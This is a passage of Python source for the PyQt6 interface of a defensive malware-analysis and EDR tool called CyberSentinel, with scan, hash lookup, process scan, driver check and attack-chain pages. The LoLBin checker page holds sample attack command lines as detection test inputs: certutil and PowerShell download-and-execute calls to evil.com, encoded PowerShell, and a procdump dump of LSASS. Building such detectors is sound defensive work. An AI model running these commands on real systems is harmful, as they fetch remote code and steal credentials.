        clear_btn = QPushButton("🗑  Clear")
        clear_btn.setMinimumWidth(80)
        clear_btn.clicked.connect(lambda: self._scan_console.clear_console())
        opts_row.addWidget(clear_btn)

        self._scan_save_btn = QPushButton("💾  Save Session")
        self._scan_save_btn.setMinimumWidth(120)
        self._scan_save_btn.setEnabled(False)
        self._scan_save_btn.setToolTip(
            "Save the current scan session to a .txt report file in Analysis Files\\"
        )
        self._scan_save_btn.clicked.connect(
            lambda: self.logic.save_session_log() if self.logic.session_log else None
        )
        opts_row.addWidget(self._scan_save_btn)

        inner_layout.addLayout(opts_row)

        # Progress
        self._scan_progress = QProgressBar()
        self._scan_progress.setRange(0, 0)
        self._scan_progress.setVisible(False)
        self._scan_progress.setFixedHeight(4)
        inner_layout.addWidget(self._scan_progress)

        # Console
        self._scan_console = ConsoleWidget()
        self._scan_console.append_line("● Ready to scan. Select a file and click Run Scan.", THEME["muted"])
        inner_layout.addWidget(self._scan_console, 1)

        layout.addWidget(inner, 1)
        return page

    def _browse_scan_file(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select File")
        if path:
            self._scan_path.setText(path)

    def _browse_scan_dir(self):
        path = QFileDialog.getExistingDirectory(self, "Select Directory")
        if path:
            self._scan_path.setText(path)

    def _run_scan_file(self):
        target = self._scan_path.text().strip().strip("\"'")
        if not target:
            QMessageBox.warning(self, "No Target", "Please select a file or directory first.")
            return

        engine_map = {0: "consensus", 1: "virustotal", 2: "alienvault",
                      3: "metadefender", 4: "malwarebazaar"}
        self._register_gui_callbacks(self._scan_console)
        self._scan_console.clear_console()
        self._scan_console.append_line(f"[*] Starting scan: {target}", THEME["blue"])
        self._scan_progress.setVisible(True)
        self._scan_file_btn.setEnabled(False)
        self._scan_save_btn.setEnabled(False)

        worker = ScanWorker(self.logic, target)
        worker.line_out.connect(self._scan_console.append_line)
        worker.finished.connect(self._scan_done)
        self._workers.append(worker)
        worker.start()

    # ── GUI CALLBACKS — replaces input() for all threat prompts ──────────────

    def _register_gui_callbacks(self, console: "ConsoleWidget"):
        """
        Set headless_mode=False and attach Qt dialog callbacks so that
        _prompt_quarantine and engine selection use dialogs instead of input().
        Called before every scan worker is started.
        """
        self.logic.headless_mode = False
        self.logic.gui_callbacks = {
            "ask":       self._gui_ask,
            "ai_report": lambda report: self._show_ai_report(report, console),
            "engine":    self._gui_get_engine,
            "feedback":  self._gui_feedback_dialog,
        }

    def _gui_feedback_dialog(
        self,
        sha256:                   str,
        filename:                 str,
        file_path:                str,
        verdict:                  str,
        prefetched_features_json: str | None = None,
    ):
        """
        Shows an inline post-scan analyst feedback dialog immediately after a
        malicious verdict while the scan context (file_path) is still available.

        This is the correct integration point for Adaptive Learning because:
          - file_path is known here → PE features can be extracted
          - The analyst reviews the verdict while it is fresh
          - CONFIRMED submissions register as anchors with real feature vectors
          - FP/FN submissions queue corrections with real feature vectors

        Called from _prompt_quarantine Step 7 in GUI mode.
        Previously this step only printed "Review in Analyst Feedback tab"
        and discarded the file_path, making adaptive learning impossible.
        """
        import threading
        done = threading.Event()

        def _show():
            try:
                from PyQt6.QtWidgets import (
                    QDialog, QVBoxLayout, QHBoxLayout, QLabel,
                    QComboBox, QLineEdit, QPushButton, QFrame
                )

                dlg = QDialog(self)
                dlg.setWindowTitle("Analyst Verdict Review")
                dlg.setMinimumWidth(520)
                dlg.setStyleSheet(f"QDialog {{ background: {THEME['surface']}; }}")
                layout = QVBoxLayout(dlg)
                layout.setSpacing(12)
                layout.setContentsMargins(20, 20, 20, 20)

                # Header
                header = QLabel("Analyst Verdict Review")
                header.setStyleSheet(
                    f"color: {THEME['blue']}; font-size: 14px; font-weight: bold;"
                )
                layout.addWidget(header)

                # File info
                info_frame = QFrame()
                info_frame.setStyleSheet(
                    f"background: #0a0e14; border: 1px solid {THEME['border']}; "
                    f"border-radius: 4px; padding: 8px;"
                )
                info_layout = QVBoxLayout(info_frame)
                info_layout.setSpacing(4)
                for label, value, color in [
                    ("File",    filename,         THEME["text"]),
                    ("SHA-256", sha256[:32]+"...", THEME["muted"]),
                    ("Verdict", verdict,
                     THEME["red"] if "MALICIOUS" in verdict.upper() else THEME["yellow"]),
                ]:
                    row = QHBoxLayout()
                    lbl = QLabel(f"{label}:")
                    lbl.setMinimumWidth(60)
                    lbl.setStyleSheet(f"color: {THEME['muted']}; font-size: 11px; border: none;")
                    val = QLabel(value)
                    val.setStyleSheet(f"color: {color}; font-size: 11px; border: none;")
                    row.addWidget(lbl)
                    row.addWidget(val)
                    row.addStretch()
                    info_layout.addLayout(row)
                layout.addWidget(info_frame)

                # Verdict selector
                verdict_row = QHBoxLayout()
                verdict_lbl = QLabel("Your assessment:")
                verdict_lbl.setStyleSheet(f"color: {THEME['text']}; border: none;")
                verdict_combo = QComboBox()
                verdict_combo.addItems(["CONFIRMED", "FALSE_POSITIVE", "FALSE_NEGATIVE"])
                verdict_combo.setToolTip(
                    "CONFIRMED — the system was correct\n"
                    "FALSE_POSITIVE — file is safe, system over-detected\n"
                    "FALSE_NEGATIVE — file IS malicious, system under-detected"
                )
                verdict_row.addWidget(verdict_lbl)
                verdict_row.addWidget(verdict_combo)
                verdict_row.addStretch()
                layout.addLayout(verdict_row)

                # Notes field
                notes_row = QHBoxLayout()
                notes_lbl = QLabel("Notes:")
                notes_lbl.setStyleSheet(f"color: {THEME['text']}; border: none;")
                notes_lbl.setMinimumWidth(60)
                notes_input = QLineEdit()
                notes_input.setPlaceholderText(
                    "Required for FP/FN — explain why the verdict is wrong"
                )
                notes_row.addWidget(notes_lbl)
                notes_row.addWidget(notes_input)
                layout.addLayout(notes_row)

                # Adaptive learning note
                al_note = QLabel(
                    "ℹ  Your review will be used to improve the ML model. "
                    "Features are extracted from the file immediately while it is accessible."
                )
                al_note.setWordWrap(True)
                al_note.setStyleSheet(
                    f"color: {THEME['muted']}; font-size: 10px; border: none;"
                )
                layout.addWidget(al_note)

                # Buttons
                btn_row = QHBoxLayout()
                submit_btn = QPushButton("✔  Submit Review")
                submit_btn.setObjectName("primary")
                submit_btn.setMinimumWidth(150)
                skip_btn   = QPushButton("Skip")
                skip_btn.setMinimumWidth(80)
                btn_row.addStretch()
                btn_row.addWidget(submit_btn)
                btn_row.addWidget(skip_btn)
                layout.addLayout(btn_row)

                def _submit():
                    analyst = verdict_combo.currentText()
                    notes   = notes_input.text().strip()
                    if analyst in ("FALSE_POSITIVE", "FALSE_NEGATIVE") and not notes:
                        notes_input.setPlaceholderText("⚠ Notes are required for FP/FN")
                        notes_input.setStyleSheet(
                            f"border: 1px solid {THEME['red']};"
                        )
                        return
                    # Submit with real file_path AND pre-extracted features.
                    # prefetched_features_json was captured in _prompt_quarantine
                    # Step 0.5 before quarantine ran — so adaptive learning works
                    # even when the file is already encrypted in the Quarantine folder.
                    try:
                        from modules import feedback as fb_mod
                        fb_mod.submit_gui_correction(
                            sha256=sha256,
                            filename=filename,
                            file_path=file_path,
                            analyst_verdict=analyst,
                            original_verdict=verdict,
                            notes=notes,
                            prefetched_features_json=prefetched_features_json,
                        )
                    except Exception as e:
                        print(f"[-] Feedback submission error: {e}")
                    dlg.accept()

                submit_btn.clicked.connect(_submit)
                skip_btn.clicked.connect(dlg.reject)
                dlg.exec()

            except Exception as e:
                print(f"[-] Feedback dialog error: {e}")
            finally:
                done.set()

        self._run_on_main_signal.emit(_show)
        done.wait(timeout=60)

    def _gui_get_engine(self) -> str:
        """
        Returns the engine selected in the Scan File combo box.
        Called from scan_file() instead of the CLI input() prompt.
        Falls back to 'consensus' if the combo is not available.
        """
        engine_map = {
            0: "consensus",
            1: "virustotal",
            2: "alienvault",
            3: "metadefender",
            4: "malwarebazaar",
        }
        try:
            idx = self._scan_engine_combo.currentIndex()
            return engine_map.get(idx, "consensus")
        except AttributeError:
            return "consensus"

    def _gui_ask(self, question: str) -> bool:
        """
        Thread-safe blocking Y/N dialog invoked from the scan worker thread.
        Uses a threading.Event so the worker thread blocks until the user clicks.
        """
        import threading
        result = [False]
        done   = threading.Event()

        def _show():
            # R3 Fix: done.set() in finally block guarantees the worker thread
            # is always released, even if the dialog raises an exception.
            try:
                from PyQt6.QtWidgets import QMessageBox
                box = QMessageBox(self)
                box.setWindowTitle("CyberSentinel — Action Required")
                box.setText(question)
                box.setIcon(QMessageBox.Icon.Warning)
                box.setStandardButtons(
                    QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
                )
                box.setDefaultButton(QMessageBox.StandardButton.No)
                box.setStyleSheet(
                    f"QMessageBox {{ background: {THEME['surface']}; color: {THEME['text']}; }}"
                    f"QLabel {{ color: {THEME['text']}; font-size: 12px; }}"
                    f"QPushButton {{ min-width: 80px; }}"
                )
                result[0] = (box.exec() == QMessageBox.StandardButton.Yes)
            except Exception:
                result[0] = False   # Safe default — do not quarantine on error
            finally:
                done.set()          # Always release the worker thread

        # Schedule _show on the Qt main thread via a signal, then block
        self._run_on_main_signal.emit(_show)
        done.wait(timeout=120)
        return result[0]

    def _show_ai_report(self, report: str, console: "ConsoleWidget"):
        """
        Display the AI analyst report in a dedicated resizable dialog.
        Must run on the Qt main thread — scheduled via signal from worker thread.
        """
        def _do():
            from PyQt6.QtWidgets import QDialog, QVBoxLayout, QTextEdit, QPushButton
            dlg = QDialog(self)
            dlg.setWindowTitle("AI Analyst Report — CyberSentinel")
            dlg.setMinimumSize(700, 520)
            dlg.setStyleSheet(f"QDialog {{ background: {THEME['surface']}; }}")
            layout = QVBoxLayout(dlg)

            title = QLabel("🤖  AI Threat Analyst Report")
            title.setStyleSheet(
                f"color: {THEME['blue']}; font-size: 14px; font-weight: bold; padding: 4px;"
            )
            layout.addWidget(title)

            text = QTextEdit()
            text.setReadOnly(True)
            text.setFont(QFont("Consolas", 11))
            text.setStyleSheet(
                f"background: #0a0e14; color: {THEME['text']}; "
                f"border: 1px solid {THEME['border']};"
            )
            text.setPlainText(report)
            layout.addWidget(text)

            close_btn = QPushButton("Close")
            close_btn.setMinimumWidth(100)
            close_btn.clicked.connect(dlg.accept)
            layout.addWidget(close_btn, alignment=Qt.AlignmentFlag.AlignRight)

            # Echo to console panel (already on main thread here)
            console.append_line("--- AI Analyst Report ---", THEME["purple"])
            for line in report.splitlines():
                console.append_line(line)

            dlg.show()

        # Always run on the Qt main thread regardless of which thread called us
        self._run_on_main_signal.emit(_do)

    def _scan_done(self, ok: bool):
        self._scan_progress.setVisible(False)
        self._scan_file_btn.setEnabled(True)
        self._scan_save_btn.setEnabled(True)
        msg = "[+] Scan complete." if ok else "[-] Scan ended with errors."
        self._scan_console.append_line(msg, THEME["green"] if ok else THEME["red"])
        self._refresh_dashboard()
        # Ask analyst if they want to save the session report
        if ok and self.logic.session_log:
            self.logic.save_session_log()

    # ── PAGE: SCAN HASH ───────────────────────────────────────────────────────

    def _build_scan_hash_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        layout.addWidget(self._page_header(
            "🔑", "Scan Hash / IoC Batch",
            "Enter a SHA-256/MD5/SHA-1 hash, or load a .txt IoC list"
        ))

        inner = QWidget()
        inner_layout = QVBoxLayout(inner)
        inner_layout.setContentsMargins(24, 20, 24, 20)
        inner_layout.setSpacing(12)

        grp = QGroupBox("Hash Input")
        grp_layout = QVBoxLayout(grp)

        single_row = QHBoxLayout()
        self._hash_input = QLineEdit()
        self._hash_input.setPlaceholderText("Paste a single SHA-256 / MD5 / SHA-1 hash…")
        self._hash_input.returnPressed.connect(self._run_hash_scan)
        single_row.addWidget(self._hash_input)
        scan_hash_btn = QPushButton("▶  Scan")
        scan_hash_btn.setObjectName("primary")
        scan_hash_btn.setMinimumWidth(80)
        scan_hash_btn.clicked.connect(self._run_hash_scan)
        single_row.addWidget(scan_hash_btn)
        grp_layout.addLayout(single_row)

        batch_row = QHBoxLayout()
        self._ioc_path = QLineEdit()
        self._ioc_path.setPlaceholderText("Or load a .txt file with one hash per line…")
        browse_ioc_btn = QPushButton("📂  Load .txt")
        browse_ioc_btn.setMinimumWidth(100)
        browse_ioc_btn.clicked.connect(self._browse_ioc)
        scan_batch_btn = QPushButton("▶  Batch Scan")
        scan_batch_btn.setObjectName("primary")
        scan_batch_btn.setMinimumWidth(110)
        scan_batch_btn.clicked.connect(self._run_batch_scan)
        batch_row.addWidget(self._ioc_path)
        batch_row.addWidget(browse_ioc_btn)
        batch_row.addWidget(scan_batch_btn)
        grp_layout.addLayout(batch_row)
        inner_layout.addWidget(grp)

        self._hash_console = ConsoleWidget()
        self._hash_console.append_line("● Enter a hash or load a .txt batch file.", THEME["muted"])
        inner_layout.addWidget(self._hash_console, 1)

        layout.addWidget(inner, 1)
        return page

    def _browse_ioc(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select IoC List", filter="Text Files (*.txt)")
        if path:
            self._ioc_path.setText(path)

    def _run_hash_scan(self):
        h = self._hash_input.text().strip()
        if not h:
            return
        if len(h) not in (32, 40, 64):
            QMessageBox.warning(self, "Invalid Hash", "Hash must be 32 (MD5), 40 (SHA-1), or 64 (SHA-256) characters.")
            return
        self._hash_console.clear_console()
        self._register_gui_callbacks(self._hash_console)
        worker = HashWorker(self.logic, [h])
        worker.line_out.connect(self._hash_console.append_line)
        worker.finished.connect(lambda ok: self._refresh_dashboard())
        self._workers.append(worker)
        worker.start()

    def _run_batch_scan(self):
        path = self._ioc_path.text().strip().strip("\"'")
        if not path or not os.path.isfile(path):
            QMessageBox.warning(self, "No File", "Please select a valid .txt IoC file.")
            return
        try:
            with open(path, "r", encoding="utf-8") as f:
                hashes = [l.strip() for l in f if l.strip() and len(l.strip()) in (32, 40, 64)]
        except Exception as e:
            QMessageBox.critical(self, "Error", str(e))
            return
        if not hashes:
            QMessageBox.warning(self, "No Hashes", "No valid hashes found in the file.")
            return
        self._hash_console.clear_console()
        self._hash_console.append_line(f"[*] Loaded {len(hashes)} hashes from {os.path.basename(path)}", THEME["blue"])
        self._register_gui_callbacks(self._hash_console)
        worker = HashWorker(self.logic, hashes)
        worker.line_out.connect(self._hash_console.append_line)
        worker.finished.connect(lambda ok: self._refresh_dashboard())
        self._workers.append(worker)
        worker.start()

    # ── PAGE: LIVE EDR ────────────────────────────────────────────────────────

    def _build_live_edr_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        layout.addWidget(self._page_header(
            "⚡", "Live EDR — Active Memory Analysis",
            "Click Enumerate to list running processes, then select a row and click Scan"
        ))

        inner = QWidget()
        inner_layout = QVBoxLayout(inner)
        inner_layout.setContentsMargins(24, 20, 24, 20)
        inner_layout.setSpacing(12)

        note = QLabel("⚠️  Administrator privileges may be required to read process memory.")
        note.setStyleSheet(f"color: {THEME['yellow']}; font-size: 11px;")
        inner_layout.addWidget(note)

        # Button row
        btn_row = QHBoxLayout()
        enum_btn = QPushButton("📋  Enumerate Processes")
        enum_btn.setMinimumWidth(190)
        enum_btn.clicked.connect(self._enumerate_processes)
        btn_row.addWidget(enum_btn)

        self._edr_scan_btn = QPushButton("⚡  Scan Selected Process")
        self._edr_scan_btn.setObjectName("primary")
        self._edr_scan_btn.setMinimumWidth(190)
        self._edr_scan_btn.setEnabled(False)
        self._edr_scan_btn.clicked.connect(self._scan_selected_process)
        btn_row.addWidget(self._edr_scan_btn)

        self._edr_filter = QLineEdit()
        self._edr_filter.setPlaceholderText("Filter by name or path…")
        self._edr_filter.textChanged.connect(self._filter_edr_table)
        btn_row.addWidget(self._edr_filter)
        inner_layout.addLayout(btn_row)

        # Process table — click a row to select the process
        self._edr_table = make_table(["PID", "Process Name", "Executable Path"])
        self._edr_table.setSelectionMode(QTableWidget.SelectionMode.SingleSelection)
        self._edr_table.itemSelectionChanged.connect(self._edr_selection_changed)
        self._edr_table.doubleClicked.connect(self._scan_selected_process)
        inner_layout.addWidget(self._edr_table, 1)

        # Console below table
        self._edr_console = ConsoleWidget()
        self._edr_console.setMaximumHeight(160)
        self._edr_console.append_line(
            "● Click Enumerate Processes, then select a row and click Scan Selected Process.",
            THEME["muted"]
        )
        inner_layout.addWidget(self._edr_console)

        self._edr_procs = []   # store full proc list for filtering
        layout.addWidget(inner, 1)
        return page

    def _enumerate_processes(self):
        import psutil
        self._edr_table.setRowCount(0)
        self._edr_procs = []
        self._edr_scan_btn.setEnabled(False)
        self._edr_console.clear_console()
        self._edr_console.append_line("[*] Enumerating processes…", THEME["blue"])

        for proc in psutil.process_iter(["pid", "name", "exe"]):
            try:
                exe = proc.info["exe"]
                if exe and "C:\\Windows" not in exe:
                    self._edr_procs.append({
                        "pid":  proc.info["pid"],
                        "name": proc.info["name"],
                        "path": exe,
                    })
            except (psutil.AccessDenied, psutil.NoSuchProcess):
                continue

        self._populate_edr_table(self._edr_procs)
        self._edr_console.append_line(
            f"[+] Found {len(self._edr_procs)} non-system processes. "
            "Select a row and click Scan, or double-click a row.",
            THEME["green"]
        )

    def _populate_edr_table(self, procs):
        t = self._edr_table
        t.setRowCount(0)
        for p in procs:
            row = t.rowCount()
            t.insertRow(row)
            t.setItem(row, 0, table_item(str(p["pid"]), THEME["blue"]))
            t.setItem(row, 1, table_item(p["name"]))
            t.setItem(row, 2, table_item(p["path"], THEME["muted"]))
        # Store proc data in row for retrieval
        t.setProperty("procs", procs)

    def _filter_edr_table(self, text):
        if not self._edr_procs:
            return
        text = text.lower()
        filtered = [
            p for p in self._edr_procs
            if text in p["name"].lower() or text in p["path"].lower()
        ] if text else self._edr_procs
        self._populate_edr_table(filtered)

    def _edr_selection_changed(self):
        self._edr_scan_btn.setEnabled(
            len(self._edr_table.selectedItems()) > 0
        )

    def _scan_selected_process(self):
        rows = self._edr_table.selectedItems()
        if not rows:
            return
        row = self._edr_table.currentRow()
        pid_item = self._edr_table.item(row, 0)
        path_item = self._edr_table.item(row, 2)
        if not pid_item or not path_item:
            return
        pid  = pid_item.text()
        path = path_item.text()
        name = self._edr_table.item(row, 1).text() if self._edr_table.item(row, 1) else ""

        if not path or not os.path.isfile(path):
            QMessageBox.warning(self, "Path Not Found",
                f"Could not access the executable for PID {pid}.\nThe process may have terminated or you may need administrator rights.")
            return

        self._edr_console.clear_console()
        self._edr_console.append_line(
            f"[*] Scanning PID {pid} — {name}", THEME["blue"]
        )
        self._edr_console.append_line(f"[*] Path: {path}", THEME["muted"])
        self._edr_scan_btn.setEnabled(False)

        def _do():
            self._register_gui_callbacks(self._edr_console)
            self.logic.scan_file(path)

        worker = GenericWorker(_do)
        worker.line_out.connect(self._edr_console.append_line)
        worker.finished.connect(self._edr_scan_done)
        self._workers.append(worker)
        worker.start()

    def _edr_scan_done(self, _):
        self._edr_scan_btn.setEnabled(True)
        self._edr_console.append_line("[+] Scan complete.", THEME["green"])
        self._refresh_dashboard()

    # ── PAGE: LOLBAS ─────────────────────────────────────────────────────────

    def _build_lolbas_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        layout.addWidget(self._page_header(
            "🪝", "LoLBin Abuse Checker",
            "5-layer detection: pattern matching + path normalization + "
            "argument de-obfuscation + entropy analysis + parent process context"
        ))

        inner = QWidget()
        inner_layout = QVBoxLayout(inner)
        inner_layout.setContentsMargins(24, 20, 24, 20)
        inner_layout.setSpacing(12)

        form_grp = QGroupBox("Process to Analyze")
        form = QFormLayout(form_grp)
        form.setSpacing(10)

        self._lolbas_name = QLineEdit()
        self._lolbas_name.setPlaceholderText("e.g. certutil.exe  or  C:\\Windows\\System32\\certutil.exe")

        self._lolbas_cmd = QLineEdit()
        self._lolbas_cmd.setPlaceholderText(
            "e.g. certutil.exe -urlcache -split -f http://evil.com/payload.exe"
        )
        self._lolbas_cmd.returnPressed.connect(self._run_lolbas)

        self._lolbas_parent = QLineEdit()
        self._lolbas_parent.setPlaceholderText(
            "Optional — e.g. winword.exe, explorer.exe, svchost.exe"
        )

        form.addRow(QLabel("Process Name / Path:"), self._lolbas_name)
        form.addRow(QLabel("Full Command Line:"),    self._lolbas_cmd)
        form.addRow(QLabel("Parent Process:"),       self._lolbas_parent)
        inner_layout.addWidget(form_grp)

        btn_row = QHBoxLayout()
        check_btn = QPushButton("🔎  Check for Abuse")
        check_btn.setObjectName("primary")
        check_btn.setMinimumWidth(160)
        check_btn.clicked.connect(self._run_lolbas)
        btn_row.addWidget(check_btn)

        # Quick examples including obfuscation test cases
        examples = [
            ("certutil download",    "certutil.exe",    "certutil.exe -urlcache -split -f http://evil.com/p.exe C:\\tmp\\p.exe",         ""),
            ("PowerShell -enc",      "powershell.exe",  "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",  ""),
            ("Caret obfuscation",    "certutil.exe",    "cer^tu^til.exe -ur^lc^ac^he -f http://evil.com/p.exe",                          ""),
            ("ProcDump LSASS",       "procdump.exe",    "procdump.exe -ma lsass.exe C:\\tmp\\lsass.dmp",                                  ""),
            ("mshta remote",         "mshta.exe",       "mshta.exe https://evil.com/script.hta",                                          ""),
            ("Office spawns PS",     "powershell.exe",  "powershell.exe -nop -exec bypass -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com')",
                                                                                                                                           "winword.exe"),
        ]
        for label, name, cmd, parent in examples:
            eb = QPushButton(f"▸ {label}")
            eb.setMinimumWidth(120)
            eb.clicked.connect(lambda _, n=name, c=cmd, p=parent: (
                self._lolbas_name.setText(n),
                self._lolbas_cmd.setText(c),
                self._lolbas_parent.setText(p),
            ))
            btn_row.addWidget(eb)
        btn_row.addStretch()
        inner_layout.addLayout(btn_row)

        self._lolbas_console = ConsoleWidget()
        self._lolbas_console.append_line(
            "● Enter a process name + command line and click Check for Abuse.\n"
            "  The checker now normalizes obfuscation before matching and scores confidence\n"
            "  based on detection source and parent process context.",
            THEME["muted"]
        )
        inner_layout.addWidget(self._lolbas_console, 1)

        layout.addWidget(inner, 1)
        return page

    def _run_lolbas(self):
        name   = self._lolbas_name.text().strip()
        cmd    = self._lolbas_cmd.text().strip()
        parent = self._lolbas_parent.text().strip()
        if not name:
            self._lolbas_console.append_line("⚠ Enter a process name first.", THEME["yellow"])
            return
        self._lolbas_console.clear_console()
        self._lolbas_console.append_line(f"[*] Checking: {name}", THEME["blue"])
        if parent:
            self._lolbas_console.append_line(f"[*] Parent context: {parent}", THEME["muted"])

        hit = self.lolbas.check_process(
            name,
            cmd,
            from_daemon = False,
            parent_name = parent,
            exe_path    = name if os.sep in name or "/" in name else "",
        )
        if hit:
            confidence = hit.get("confidence", "MEDIUM")
            color = {
                "HIGH":   THEME["red"],
                "MEDIUM": THEME["yellow"],
                "LOW":    THEME["blue"],
            }.get(confidence, THEME["yellow"])

            self._lolbas_console.append_line(
                f"[!] LOLBIN ABUSE DETECTED — {confidence} CONFIDENCE",
                color
            )
            alert = self.lolbas.format_alert(hit)
            for line in alert.splitlines():
                self._lolbas_console.append_line(line)

            # Show normalization result if obfuscation was stripped
            normalized = hit.get("cmdline_normalized", "")
            if normalized and normalized != cmd:
                self._lolbas_console.append_line("", THEME["muted"])
                self._lolbas_console.append_line(
                    "ℹ  Obfuscation detected and stripped before matching:",
                    THEME["blue"]
                )
                self._lolbas_console.append_line(f"  Original   : {cmd[:100]}", THEME["muted"])
                self._lolbas_console.append_line(f"  Normalized : {normalized[:100]}", THEME["green"])
        else:
            self._lolbas_console.append_line(
                f"[+] No LoLBin abuse pattern matched for '{name}'.", THEME["green"]
            )
            # Still show if obfuscation was stripped even on clean result
            from modules.lolbas_detector import _normalize_cmdline
            normalized = _normalize_cmdline(cmd)
            if normalized != cmd:
                self._lolbas_console.append_line(
                    f"[*] Note: Obfuscation was detected and stripped — "
                    f"normalized command was also checked.", THEME["muted"]
                )

    # ── PAGE: BYOVD ───────────────────────────────────────────────────────────

    def _build_byovd_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        layout.addWidget(self._page_header(
            "💀", "BYOVD Vulnerable Driver Scanner",
            "Scan System32\\drivers against the LOLDrivers vulnerable kernel driver database"
        ))

        inner = QWidget()
        inner_layout = QVBoxLayout(inner)
        inner_layout.setContentsMargins(24, 20, 24, 20)
        inner_layout.setSpacing(12)

        note = QLabel("Scans all .sys files in C:\\Windows\\System32\\drivers against the LOLDrivers database.")
        note.setStyleSheet(f"color: {THEME['muted']}; font-size: 11px;")
        inner_layout.addWidget(note)

        btn_row = QHBoxLayout()
        scan_btn = QPushButton("💀  Scan Loaded Drivers")
        scan_btn.setObjectName("primary")
        scan_btn.setMinimumWidth(180)
        scan_btn.clicked.connect(self._run_byovd)
        btn_row.addWidget(scan_btn)
        btn_row.addStretch()
        inner_layout.addLayout(btn_row)

        self._byovd_progress = QProgressBar()
        self._byovd_progress.setRange(0, 0)
        self._byovd_progress.setVisible(False)
        self._byovd_progress.setFixedHeight(4)
        inner_layout.addWidget(self._byovd_progress)

        grp = QGroupBox("Driver Scan Results")
        grp_layout = QVBoxLayout(grp)
        self._byovd_table = make_table(["Driver", "CVE", "SHA-256", "Risk Level", "Details"])
        grp_layout.addWidget(self._byovd_table)
        inner_layout.addWidget(grp, 1)

        layout.addWidget(inner, 1)
        return page

    def _run_byovd(self):
        self._byovd_table.setRowCount(0)
        self._byovd_progress.setVisible(True)

        def _do():
            return self.byovd.scan_loaded_drivers()

        worker = GenericWorker(_do)
        worker.line_out.connect(lambda txt: None)
        worker.finished.connect(self._byovd_done)
        self._workers.append(worker)
        worker.start()

    def _byovd_done(self, findings):
        self._byovd_progress.setVisible(False)
        t = self._byovd_table
        t.setRowCount(0)
        if not findings:
            row = t.rowCount(); t.insertRow(row)
            t.setItem(row, 0, table_item("✅  No vulnerable drivers found", THEME["green"]))
            for i in range(1, 5):
                t.setItem(row, i, table_item(""))
        else:
            for f in findings:
                row = t.rowCount(); t.insertRow(row)
                t.setItem(row, 0, table_item(f.get("driver_name", "—")))
                t.setItem(row, 1, table_item(f.get("cve", "N/A"), THEME["red"]))
                t.setItem(row, 2, table_item(f.get("sha256") or "", THEME["muted"]))
                t.setItem(row, 3, table_item(f.get("risk_level", "HIGH"), THEME["red"]))
                t.setItem(row, 4, table_item((f.get("description") or "")[:60], THEME["muted"]))

    # ── PAGE: ATTACK CHAINS ───────────────────────────────────────────────────

    def _build_chains_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        layout.addWidget(self._page_header(
            "🔗", "Attack Chain Correlation",
            "Multi-event attack sequence detection — reads from shared event timeline"
        ))

        inner = QWidget()
        inner_layout = QVBoxLayout(inner)
        inner_layout.setContentsMargins(24, 20, 24, 20)
        inner_layout.setSpacing(12)

        btn_row = QHBoxLayout()
        run_btn = QPushButton("🔗  Run Correlation Sweep")
        run_btn.setObjectName("primary")
        run_btn.setMinimumWidth(200)
        run_btn.clicked.connect(self._refresh_chains)
        btn_row.addWidget(run_btn)
        btn_row.addStretch()
        inner_layout.addLayout(btn_row)

        grp = QGroupBox("Detected Attack Chains")
        grp_layout = QVBoxLayout(grp)
        self._chains_table = make_table(
            ["Timestamp", "Chain", "MITRE", "Severity", "Description"],
            stretch_col=4,
            wrap_last=True,
        )
        self._chains_table.setColumnWidth(0, 155)
        self._chains_table.setColumnWidth(1, 180)
        self._chains_table.setColumnWidth(2, 130)
        self._chains_table.setColumnWidth(3, 90)
        grp_layout.addWidget(self._chains_table)
        inner_layout.addWidget(grp, 1)

        layout.addWidget(inner, 1)
        return page

    def _refresh_chains(self):
        if hasattr(self, 'correlator'):
            try:
                self.correlator.run_correlation()
            except Exception:
                pass
        rows = _db_query(
            "SELECT chain_name, mitre, severity, description, timestamp FROM chain_alerts ORDER BY timestamp DESC LIMIT 50"
        )
        t = self._chains_table
        t.setRowCount(0)
        if not rows:
            row = t.rowCount(); t.insertRow(row)
            t.setItem(row, 0, table_item("No attack chains detected yet.", THEME["muted"]))
            for i in range(1, 5):
                t.setItem(row, i, table_item(""))
        else:
            for r in rows:
                row = t.rowCount(); t.insertRow(row)
                sev = r.get("severity", "MEDIUM")
                t.setItem(row, 0, table_item(r.get("timestamp", "")))
                t.setItem(row, 1, table_item(r.get("chain_name", "—"), THEME["red"]))
                t.setItem(row, 2, table_item(r.get("mitre", "—"), THEME["blue"]))
                t.setItem(row, 3, table_item(sev, THEME["red"] if sev == "CRITICAL" else THEME["yellow"]))
                t.setItem(row, 4, table_item(r.get("description") or "—", THEME["muted"]))
            # Resize rows so full description text is visible without truncation
            t.resizeRowsToContents()

    # ── PAGE: BASELINE ────────────────────────────────────────────────────────

    def _build_baseline_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        layout.addWidget(self._page_header(
            "📐", "Environment Baseline Manager",
            "Learn normal host behavior — flag deviations as anomalies"
        ))

        inner = QWidget()
        inner_layout = QVBoxLayout(inner)
        inner_layout.setContentsMargins(24, 20, 24, 20)
        inner_layout.setSpacing(16)

        ctrl_grp = QGroupBox("Learn Mode Control")
        ctrl_layout = QHBoxLayout(ctrl_grp)

        dur_label = QLabel("Learn duration (hours):")
        dur_label.setStyleSheet(f"color: {THEME['muted']}; border: none;")
        self._baseline_hours = QSpinBox()
        self._baseline_hours.setRange(1, 168)
        self._baseline_hours.setValue(24)
        self._baseline_hours.setMinimumWidth(80)

        start_btn = QPushButton("▶  Start Learning")
        start_btn.setObjectName("success")
        start_btn.setMinimumWidth(140)
        start_btn.clicked.connect(self._start_baseline)

        stop_btn = QPushButton("■  Stop & Save")
        stop_btn.setObjectName("danger")
        stop_btn.setMinimumWidth(120)
